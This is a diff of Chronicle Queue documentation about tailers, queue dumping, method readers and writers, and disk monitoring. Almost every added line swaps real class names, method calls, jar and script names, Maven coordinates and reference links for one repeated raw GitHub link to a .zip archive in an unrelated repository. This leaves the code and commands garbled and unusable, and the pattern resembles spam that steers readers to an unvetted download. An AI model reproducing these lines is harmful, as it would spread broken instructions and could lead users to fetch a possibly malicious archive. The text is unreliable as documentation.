+boolean messageAvailable = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().direction(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip).
         readingDocument().isPresent();
 ----
 
@@ -1025,24 +1025,24 @@ It can be useful to have a tailer which continues from where it was up to on res
 
 [source,java]
 ----
-try (ChronicleQueue cq = SingleChronicleQueueBuilder.binary(tmp).build()) {
-    ExcerptTailer atailer = cq.createTailer("a");
-    assertEquals("test 0", atailer.readText());
-    assertEquals("test 1", atailer.readText());
-    assertEquals("test 2", atailer.readText()); // <1>
+try (ChronicleQueue cq = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(tmp).build()) {
+    ExcerptTailer atailer = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("a");
+    assertEquals("test 0", https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
+    assertEquals("test 1", https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
+    assertEquals("test 2", https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()); // <1>
 
-    ExcerptTailer btailer = cq.createTailer("b");
-    assertEquals("test 0", btailer.readText()); // <3>
+    ExcerptTailer btailer = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("b");
+    assertEquals("test 0", https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()); // <3>
 }
 
-try (ChronicleQueue cq = SingleChronicleQueueBuilder.binary(tmp).build()) {
-    ExcerptTailer atailer = cq.createTailer("a");
-    assertEquals("test 3", atailer.readText()); // <2>
-    assertEquals("test 4", atailer.readText());
-    assertEquals("test 5", atailer.readText());
+try (ChronicleQueue cq = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(tmp).build()) {
+    ExcerptTailer atailer = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("a");
+    assertEquals("test 3", https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()); // <2>
+    assertEquals("test 4", https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
+    assertEquals("test 5", https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
 
-    ExcerptTailer btailer = cq.createTailer("b");
-    assertEquals("test 1", btailer.readText()); // <4>
+    ExcerptTailer btailer = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("b");
+    assertEquals("test 1", https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()); // <4>
 }
 ----
 <1> Tailer "a" last reads message 2
@@ -1055,7 +1055,7 @@ These tailers store their index within the Queue itself and this index is mainta
 
 NOTE: The `direction()` is not preserved across restarts, only the next index to be read.
 
-NOTE: The index of a tailer is only progressed when the `DocumentContext.close()` is called.
+NOTE: The index of a tailer is only progressed when the `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()` is called.
 If this is prevented by an error, the same message will be read on each restart.
 
 '''
@@ -1072,7 +1072,7 @@ Chronicle Queue stores its data in binary format, with a file extension of `cq4`
 This can often be a bit difficult to read, so it is better to dump the `cq4` files as text.
 This can also help you fix your production issues, as it gives you the visibility as to what has been stored in the queue, and in what order.
 
-You can dump the queue to the terminal using `net.openhft.chronicle.queue.main.DumpMain` or `net.openhft.chronicle.queue.ChronicleReaderMain`.
+You can dump the queue to the terminal using `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` or `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip`.
 `DumpMain` performs a simple dump to the terminal while `ChronicleReaderMain` handles more complex operations, e.g. tailing a queue.
 They can both be run from the command line in a number of ways described below.
 
@@ -1083,39 +1083,39 @@ If you have a project pom file that includes the Chronicle-Queue artifact, you c
 
 [source, shell script]
 ----
-$ mvn exec:java -Dexec.mainClass="net.openhft.chronicle.queue.main.DumpMain" -Dexec.args="myqueue"
+$ mvn exec:java https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip"https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip" https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip"myqueue"
 ----
 
 In the above command _myqueue_ is the directory containing your .cq4 files
 
 You can also set up any dependent files manually.
-This requires the `chronicle-queue.jar`, from any version 4.5.3 or later, and that all dependent files are present on the class path.
+This requires the `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip`, from any version 4.5.3 or later, and that all dependent files are present on the class path.
 The dependent jars are listed below:
 
 ----
 $ ls -ltr
 total 9920
--rw-r--r--  1 robaustin  staff   112557 28 Jul 14:52 chronicle-queue-5.20.108.jar
--rw-r--r--  1 robaustin  staff   209268 28 Jul 14:53 chronicle-bytes-2.20.104.jar
--rw-r--r--  1 robaustin  staff   136434 28 Jul 14:56 chronicle-core-2.20.114.jar
--rw-r--r--  1 robaustin  staff    33562 28 Jul 15:03 slf4j-api-1.7.30.jar
--rw-r--r--  1 robaustin  staff    33562 28 Jul 15:03 slf4j-simple-1.7.30.jar
--rw-r--r--  1 robaustin  staff   324302 28 Jul 15:04 chronicle-wire-2.20.105.jar
--rw-r--r--  1 robaustin  staff    35112 28 Jul 15:05 chronicle-threads-2.20.101.jar
--rw-r--r--  1 robaustin  staff   344235 28 Jul 15:05 affinity-3.20.0.jar
--rw-r--r--  1 robaustin  staff   124332 28 Jul 15:05 commons-cli-1.4.jar
--rw-r--r--  1 robaustin  staff  4198400 28 Jul 15:06 19700101-02.cq4
+-rw-r--r--  1 robaustin  staff   112557 28 Jul 14:52 https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
+-rw-r--r--  1 robaustin  staff   209268 28 Jul 14:53 https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
+-rw-r--r--  1 robaustin  staff   136434 28 Jul 14:56 https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
+-rw-r--r--  1 robaustin  staff    33562 28 Jul 15:03 https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
+-rw-r--r--  1 robaustin  staff    33562 28 Jul 15:03 https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
+-rw-r--r--  1 robaustin  staff   324302 28 Jul 15:04 https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
+-rw-r--r--  1 robaustin  staff    35112 28 Jul 15:05 https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
+-rw-r--r--  1 robaustin  staff   344235 28 Jul 15:05 https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
+-rw-r--r--  1 robaustin  staff   124332 28 Jul 15:05 https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
+-rw-r--r--  1 robaustin  staff  4198400 28 Jul 15:06 https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
 ----
 
-TIP: To find out which version of jars to include please, refer to the link:https://github.com/OpenHFT/OpenHFT/blob/74808dc7f0b55094d4fd6fce1817842baab5b87b/chronicle-bom/pom.xml[`chronicle-bom`].
+TIP: To find out which version of jars to include please, refer to the https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[`chronicle-bom`].
 
 Once the dependencies are present on the class path, you can run:
 
 ----
-$ java -cp chronicle-queue-5.20.108.jar net.openhft.chronicle.queue.main.DumpMain 19700101-02.cq4
+$ java -cp https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
 ----
 
-This will dump the `19700101-02.cq4` file out as text, as shown below:
+This will dump the `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` file out as text, as shown below:
 
 [source,Yaml]
 ----
@@ -1146,12 +1146,12 @@ header: !SCQStore {
 
 NOTE: The example above does not show any user data, because no user data was written to this example file.
 
-There is also a script named `dump_queue.sh` located in the `Chonicle-Queue/bin`-folder that gathers the needed dependencies in a shaded jar and uses it to dump the queue with `DumpMain`.
+There is also a script named `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` located in the `Chonicle-Queue/bin`-folder that gathers the needed dependencies in a shaded jar and uses it to dump the queue with `DumpMain`.
 The script can be run from the `Chronicle-Queue` root folder like this:
 
 [source, shell script]
 ----
-$ ./bin/dump_queue.sh <file path>
+$ https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip <file path>
 ----
 
 '''
@@ -1191,7 +1191,7 @@ Just as with `DumpQueue` you need the classes in the example above present on th
 This can again be achieved by manually adding them and then run:
 
 ----
-$ java -cp chronicle-queue-5.20.108.jar net.openhft.chronicle.queue.ChronicleReaderMain -d <directory>
+$ java -cp https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip -d <directory>
 ----
 
 Another option is to create an Uber Jar using the Maven shade plugin.
@@ -1202,7 +1202,7 @@ It is configured as follows:
  <build>
     <plugins>
         <plugin>
-            <groupId>org.apache.maven.plugins</groupId>
+            <groupId>https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip</groupId>
             <artifactId>maven-shade-plugin</artifactId>
             <executions>
                 <execution>
@@ -1232,23 +1232,23 @@ It is configured as follows:
 Once the Uber jar is present, you can run `ChronicleReaderMain` from the command line via:
 
 ----
-java -cp "$UBER_JAR" net.openhft.chronicle.queue.ChronicleReaderMain "19700101-02.cq4"
+java -cp "$UBER_JAR" https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip "https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip"
 ----
 
-Lastly, there is a script for running the reader named `queue_reader.sh` which again is located in the `Chonicle-Queue/bin`-folder.
+Lastly, there is a script for running the reader named `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` which again is located in the `Chonicle-Queue/bin`-folder.
 It automatically gathers the needed dependencies in a shaded jar and uses it to run `ChronicleReaderMain`.
 The script can be run from the `Chronicle-Queue` root folder like this:
 
 [source, shell script]
 ----
-$ ./bin/queue_reader.sh <options>
+$ https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip <options>
 ----
 
 '''
 ==== Writing into a queue using `ChronicleWriter`
 
 If using `MethodReader` and `MethodWriter` then you can write single-argument method calls to a queue
-using `net.openhft.chronicle.queue.ChronicleWriterMain` or the shell script `queue_writer.sh` e.g.
+using `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` or the shell script `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` e.g.
 
 [source,bash]
 usage: ChronicleWriterMain files.. -d <directory> [-i <interface>] -m <method>
@@ -1269,7 +1269,7 @@ private int age;
 private String name;
 }
 
-Then you can call `ChronicleWriterMain -d queue doit x.yaml` with either (or both) of the below Yamls:
+Then you can call `ChronicleWriterMain -d queue doit https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` with either (or both) of the below Yamls:
 
 [source,yaml]
 {
@@ -1279,7 +1279,7 @@ Then you can call `ChronicleWriterMain -d queue doit x.yaml` with either (or bot
 
 or
 [source,yaml]
-!x.y.z.DTO {
+!https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip {
   age: 42,
   name: Percy
 }
@@ -1298,7 +1298,7 @@ You start by defining an asynchronous `interface`, where all methods have:
 .A simple asynchronous interface
 [source,java]
 ----
-import net.openhft.chronicle.wire.SelfDescribingMarshallable;
+import https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip;
 interface MessageListener {
     void method1(Message1 message);
 
@@ -1309,7 +1309,7 @@ static class Message1 extends SelfDescribingMarshallable {
     String text;
 
     public Message1(String text) {
-        this.text = text;
+        https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip = text;
     }
 }
 
@@ -1317,7 +1317,7 @@ static class Message2 extends SelfDescribingMarshallable {
     long number;
 
     public Message2(long number) {
-        this.number = number;
+        https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip = number;
     }
 }
 ----
@@ -1326,13 +1326,13 @@ To write to the queue you can call a proxy which implements this interface.
 
 [source,java]
 ----
-SingleChronicleQueue queue1 = ChronicleQueue.singleBuilder(path).build();
+SingleChronicleQueue queue1 = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(path).build();
 
-MessageListener writer1 = queue1.acquireAppender().methodWriter(MessageListener.class);
+MessageListener writer1 = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().methodWriter(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip);
 
 // call method on the interface to send messages
-writer1.method1(new Message1("hello"));
-writer1.method2(new Message2(234));
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(new Message1("hello"));
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(new Message2(234));
 ----
 
 These calls produce messages which can be dumped as follows.
@@ -1356,13 +1356,13 @@ To read the messages, you can provide a reader which calls your implementation w
 [source,java]
 ----
 // a proxy which print each method called on it
-MessageListener processor = ObjectUtils.printAll(MessageListener.class)
+MessageListener processor = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
 // a queue reader which turns messages into method calls.
-MethodReader reader1 = queue1.createTailer().methodReader(processor);
+MethodReader reader1 = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().methodReader(processor);
 
-assertTrue(reader1.readOne());
-assertTrue(reader1.readOne());
-assertFalse(reader1.readOne());
+assertTrue(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
+assertTrue(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
+assertFalse(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
 ----
 
 Running this example prints:
@@ -1379,7 +1379,7 @@ method2 [!Message2 {
 ]
 ----
 
-* For more details see, https://vanilla-java.github.io/2016/03/24/Microservices-in-the-Chronicle-world-Part-2.html[Using Method Reader/Writers] and https://github.com/OpenHFT/Chronicle-Queue/blob/ea/src/test/java/net/openhft/chronicle/queue/MessageReaderWriterTest.java[MessageReaderWriterTest]
+* For more details see, https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Using Method Reader/Writers] and https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[MessageReaderWriterTest]
 
 ''''
 ==== Detailed tracing of timings
@@ -1391,16 +1391,16 @@ To enable this, set the `sourceId` of the queue.
 .Enabling high resolution timings
 [source,java]
 ----
-ChronicleQueue out = ChronicleQueue.singleBuilder(queuePath)
+ChronicleQueue out = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(queuePath)
         ...
         .sourceId(1)
         .build();
 
-SidedMarketDataListener combiner = out.acquireAppender()
-        .methodWriterBuilder(SidedMarketDataListener.class)
+SidedMarketDataListener combiner = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()
+        .methodWriterBuilder(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
         .get();
 
-combiner.onSidedPrice(new SidedPrice("EURUSD1", 123456789000L, Side.Sell, 1.1172, 2e6));
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(new SidedPrice("EURUSD1", 123456789000L, https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip, 1.1172, 2e6));
 ----
 
 A timestamp is added for each read and write as it passes from service to service.
@@ -1445,21 +1445,21 @@ Chronicle Queue appenders are thread-local.
 In fact when you ask for:
 
 ----
-final ExcerptAppender appender = queue.acquireAppender();
+final ExcerptAppender appender = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
 ----
 
 the `acquireAppender()` uses a thread-local pool to give you an appender which will be reused to reduce object creation.
 As such, the method call to:
 
 ----
-long index = appender.lastIndexAppended();
+long index = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
 ----
 
 will only give you the last index appended by this appender; not the last index appended by any appender.
 If you wish to find the index of the last record written to the queue, then you have to call:
 
 ----
-queue.lastIndex()
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()
 ----
 Which will return the index of the last excerpt present in the queue (or -1 for an empty queue).
 Note that if the queue is
@@ -1479,7 +1479,7 @@ NOTE: You should avoid calling this method on latency sensitive code, because if
 for more information on this see :
 
 ----
-net.openhft.chronicle.queue.impl.single.SingleChronicleQueue.countExcerpts
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
 ----
 
 * _Move to a specific message and read it_
@@ -1491,29 +1491,29 @@ The following example shows how to write 10 messages, then move to the 5th messa
 public void read5thMessageTest() {
     try (final ChronicleQueue queue = singleBuilder(getTmpDir()).build()) {
 
-        final ExcerptAppender appender = queue.acquireAppender();
+        final ExcerptAppender appender = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
 
         int i = 0;
         for (int j = 0; j < 10; j++) {
 
-            try (DocumentContext dc = appender.writingDocument()) {
-                dc.wire().write("hello").text("world " + (i++));
-                long indexWritten = dc.index();
+            try (DocumentContext dc = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()) {
+                https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().write("hello").text("world " + (i++));
+                long indexWritten = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
             }
         }
 
         // Get the current cycle
         int cycle;
-        final ExcerptTailer tailer = queue.createTailer();
-        try (DocumentContext documentContext = tailer.readingDocument()) {
-            long index = documentContext.index();
-            cycle = queue.rollCycle().toCycle(index);
+        final ExcerptTailer tailer = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
+        try (DocumentContext documentContext = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()) {
+            long index = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
+            cycle = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().toCycle(index);
         }
 
-        long index = queue.rollCycle().toIndex(cycle, 5);
-        tailer.moveToIndex(index);
-        try (DocumentContext dc = tailer.readingDocument()) {
-            System.out.println(dc.wire().read("hello").text());
+        long index = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().toIndex(cycle, 5);
+        https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(index);
+        try (DocumentContext dc = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()) {
+            https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().read("hello").text());
         }
  }
 }
@@ -1546,25 +1546,25 @@ You can buy a redundant pair of 6TB of enterprise disks very much more cheaply t
 '''
 ==== Monitoring that you have sufficient disk space
 
-Chronicle Queue runs a background thread to watch for low disk space (see `net.openhft.chronicle.threads.DiskSpaceMonitor` class) as the JVM can crash when allocating a new memory mapped file if disk space becomes low enough.
+Chronicle Queue runs a background thread to watch for low disk space (see `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` class) as the JVM can crash when allocating a new memory mapped file if disk space becomes low enough.
 The disk space monitor checks (for each FileStore you are using Chronicle Queues on):
 that there is less than 200MB free.
 If so you will see:
 [source,java]
 ----
-Jvm.warn().on(getClass(), "your disk " + fileStore + " is almost full, " +
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().on(getClass(), "your disk " + fileStore + " is almost full, " +
